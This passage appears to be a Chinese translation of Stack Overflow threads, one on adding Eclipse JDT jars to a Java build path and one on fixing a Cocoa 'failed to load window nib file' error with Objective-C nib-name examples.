我可以`Add External JARs`用来指向所有 jar 文件，但考虑到我必须一遍又一遍地对新项目做同样的事情，我认为这不是一个好主意。

在这种情况下，如何将eclipse jdt jar 库放到Java Build Path 中呢？会`java.util.Collection`自动找到。我想可能有一些简单的设置方法可以自动找到 jdt jar 文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:09:02.303

假设您的项目是一个 eclipse 插件项目，您可以将 jdt 添加为依赖项，jar 将自动添加到插件依赖项中 ![jdt](../Images/dc281ebdc56c9207be0df9236e26e050.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-27T19:58:50.880

通常，我必须使用 eclipse 插件来使用 jdt 来访问工作区中的文件，并获取 jar 文件等。

但是，我发现这个解决方案对于使用 jdt/ask 非常有用。这个想法是使用字符串作为 jet 的输入，并导入相关的 jar 以使用 jdt API。

[http://www.programcreek.com/2011/01/a-complete-standalone-example-of-astparser/](http://www.programcreek.com/2011/01/a-complete-standalone-example-of-astparser/)

我不得不打开`Configure Build Path`。

![在此处输入图像描述](../Images/17cdfffb91f02a35a4f734663f40c06f.png)

然后，我可以选择并导入我从站点下载的所有 jar 文件。

![在此处输入图像描述](../Images/073987dd497ad28434aac6bebff5a66f.png)

现在，我准备好使用这些库了。

![在此处输入图像描述](../Images/ac4e80679ab93b849cee9afd728746a1.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T21:03:15.663

在您`Java Build Path`的屏幕中，您会注意到两个按钮`Add Variable`和`Add Liberary`下方`Add External Jars`。使用这些选项并定义一个新变量或新用户库；完成后，在项目构建路径中添加相同的内容。

对于较新的项目，您可以简单地重用变量/用户库。

`java.util.Collection`当**它作为库添加到您的构建路径中时被发现（请参阅屏幕截图中的第一项）。**我建议通过引入一个`User Library`.

# macos - “无法加载窗口笔尖文件”是什么意思？

> ID：12866994
> 
> 赞同：5
> 
> 时间：2012-10-12T20:56:40.930
> 
> 标签：macos, cocoa

我正在开发我的第一个 Cocoa 应用程序，我非常希望

```
[NSWindowController loadWindow]: failed to load window nib file 'Genius Document' 
```

意味着我做错了一些非常具体的事情，因为如果我必须回去重做所有绑定，我会想自杀。

FWIW，我正在使用一个基于文档的应用程序，该应用程序（到目前为止）只有一个 XIB 文件而没有 NIB 文件。

我可以发布我的绑定的代码/屏幕截图，但如果没有必要，我不想让人们通过它们。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-04T21:24:13.993

您描述的错误最终会发生，因为加载 nib 文件的调用失败。确保您为 Interface Builder 文件提供了正确的名称。

您可以通过多种方式提供正确的值（取决于您对 AppKit 的使用），因此我将列出两种最常见的可能性，您可以找出哪一种适用于您。鉴于您在问题中所说的话，我怀疑您将处理第一种情况。

**NSDocument 窗口NibName**

如果您依赖文档架构的默认设置，您可能不会直接进行有问题的调用。相反，框架使用您在给定文档类上指定的任何 nib 名称代表您进行调用。

例如，如果您要创建一个新的基于文档的项目，其文档类为“XYZDocument”，Xcode 模板将为您提供一个基本的 XYZDocument 类和一个 XYZDocument.xib 文件。XYZDocument 实现文件将包含以下内容：

```
//  XYZDocument.m

- (NSString *)windowNibName {
    return @"XYZDocument"; // this name tells AppKit which nib file to use
} 
```

如果要更改此值，则会产生`[NSWindowController loadWindow]`错误。

**NSWindowController 初始化方法**

如果您自己进行此调用（可能在您自己的 NSWindowController 子类上），那么您将编写如下代码行。

```
//  XYZWindowController.m (a subclass of NSWindowController)

- (id)init {
    self = [super initWithWindowNibName:@"XYZDocument"];
    if (self) {
      // initializations
    }
    return self;
} 
```

如果您提供的字符串参数与 nib 文件的名称不匹配，则会发生相同的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-08T13:57:37.047

我在 Xcode 中运行了一个 Clean (Cmd-Shift-K) 并为我解决了这个问题。